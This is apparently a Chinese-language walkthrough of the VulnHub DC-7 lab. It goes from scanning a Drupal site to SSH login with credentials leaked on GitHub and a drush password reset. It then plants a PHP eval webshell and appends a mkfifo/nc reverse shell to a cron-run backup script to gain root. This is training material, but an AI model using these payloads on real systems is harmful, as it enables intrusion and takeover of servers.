> 
>
>  [DC-7靶机地址](https://www.vulnhub.com/entry/dc-7,356/)
>
> 

![image-20230808204245221](./imgs/image-20230808204245221.png)

同样的，把靶机跟kali放在同一网段，（NAT模式）

**主机发现**

```shell
arp-scan -l
```

![image-20230808204710235](./imgs/image-20230808204710235.png)

**端口扫描**

```shell
nmap -A -T4 -p- 192.168.80.139
```

![image-20230808204838597](./imgs/image-20230808204838597.png)

22端口开始，80端口开启

浏览器先访问一下靶机的`80`端口

![image-20230808205223470](./imgs/image-20230808205223470.png)

熟悉的`Drupal`站点

先爆破一下目录看看

```shell
dirsearch -u 192.168.80.139 -i 200
```

![image-20230808205712637](./imgs/image-20230808205712637.png)

进到	`/usr/login`目录下看看，发现是一个登录页面，这个时候没有密码，也不知道账户名

![image-20230808205800137](./imgs/image-20230808205800137.png)

DC-7首页也提示说：`暴力或字典攻击，你可能不会成功，跳出框框思考`，就需要从其他方向找突破口了。。。。

![image-20230808210017690](./imgs/image-20230808210017690.png)



用谷歌浏览器搜索一下`Dc7User`这么个关键词，发现有一个`github`

![image-20230808211151203](./imgs/image-20230808211151203.png)

进到	`Dc7User`的`github`里面，寻找，在一个`config.php`文件里出现用户名和密码这样的`敏感信息`

![image-20230808211633738](./imgs/image-20230808211633738.png)

```php
$username = "dc7user";
$password = "MdR3xOgB7#dW";
```

尝试去网站里登录，结果报错

![image-20230808211832025](./imgs/image-20230808211832025.png)

那就再试试`ssh`登录，成功进入！！！

![image-20230808211943245](./imgs/image-20230808211943245.png)

查看都有什么文件 ，使用命令`ls`

![image-20230808212239648](./imgs/image-20230808212239648.png)

进入`backups`目录里，发现都是看不懂的，搜了一下`gpg`后缀格式，发现是一种加密的文件格式

![image-20230808213123139](./imgs/image-20230808213123139.png)

![image-20230808212323437](./imgs/image-20230808212323437.png)

再去看看`mbox`文件，发现里面内容重复的很多，是一封邮件，有一个可执行的脚本,

一个以root权限定期执行的备份任务，执行文件/opt/scripts/backups.sh



![image-20230808212220436](./imgs/image-20230808212220436.png)

---

使用`cd`命令切换到`/opt/scripts/`下看看

提示说`cd /vat/www/html`下，执行`drush 命令`

![image-20230808212708654](./imgs/image-20230808212708654.png)

查看`backups.sh`的权限，发现所有人都可以执行此文件

![image-20230808214407873](./imgs/image-20230808214407873.png)



drush即drupal shell,用于管理和操作drupal站点，可以用来修改管理员密码

```shell
drush user-password admin --password="123456"  #修改密码
```

![image-20230808215107935](./imgs/image-20230808215107935.png)

账户`admin`密码`123`，登录成功！！！！！！！！！

<img src="./imgs/image-20230808215304909.png" alt="image-20230808215304909" style="zoom:33%;" />

**点击`Manage ——> Content ——> Add content ——> Basic page`功能，尝试添加php一句话木马，发现Drupal 8版本以后为了安全需要将php单独作为一个模块导入；需要去扩展里下载安装**



<img src="./imgs/image-20230808215839662.png" alt="image-20230808215839662" style="zoom:33%;" />

<img src="./imgs/image-20230808215843571.png" alt="image-20230808215843571" style="zoom:33%;" />

以`URL`的形式安装php8 `https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz`

![image-20230808220232587](./imgs/image-20230808220232587.png)

<img src="./imgs/image-20230808220101555.png" alt="image-20230808220101555" style="zoom:33%;" />

![image-20230808221021740](./imgs/image-20230808221021740.png)

在`Extend`里的`List`里，往下滑动，找`PHP`有关的，勾选上`PHP Filter`往下滑有个`install`

![image-20230808221001333](./imgs/image-20230808221001333.png)

安装完成！！！

![image-20230808221058719](./imgs/image-20230808221058719.png)

然后来到`Content`写一个一句话木马

```php
<?php eval(@$_POST['password']);?>
```

<img src="./imgs/image-20230808221334362.png" alt="image-20230808221334362" style="zoom:33%;" />

<img src="./imgs/image-20230808221341600.png" alt="image-20230808221341600" style="zoom:33%;" />

打开中国  蚁剑连接，蚁剑连接就得知道，刚上传的一句话木马的位置

<img src="./imgs/image-20230808221523643.png" alt="image-20230808221523643" style="zoom:33%;" />

<img src="./imgs/image-20230808221545679.png" alt="image-20230808221545679" style="zoom:33%;" />

蚁剑 测试连通性

<img src="./imgs/image-20230808221637347.png" alt="image-20230808221637347" style="zoom:33%;" />

kali开启监听

```shell
nc -lvvp 8989
```

![image-20230808222034497](./imgs/image-20230808222034497.png)

当前还只是普通用户，并没有管理员权限

<img src="./imgs/image-20230808222114325.png" alt="image-20230808222114325" style="zoom:33%;" />

进入交互shell

```shell
python -c "import pty;pty.spawn('/bin/bash')"
```

![image-20230808222532990](./imgs/image-20230808222532990.png)

在新开的终端监听`4444`端口

![image-20230808223046525](./imgs/image-20230808223046525.png)

反弹shell到`bashups.sh`里

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.80.141 4444 >/tmp/f" >> backups.sh
 
```

![image-20230808223301341](./imgs/image-20230808223301341.png)

等待计划任务执行，等等等...............

![image-20230809171557884](./imgs/image-20230809171557884.png)

进到`root`家目录查看

![image-20230809171701261](./imgs/image-20230809171701261.png)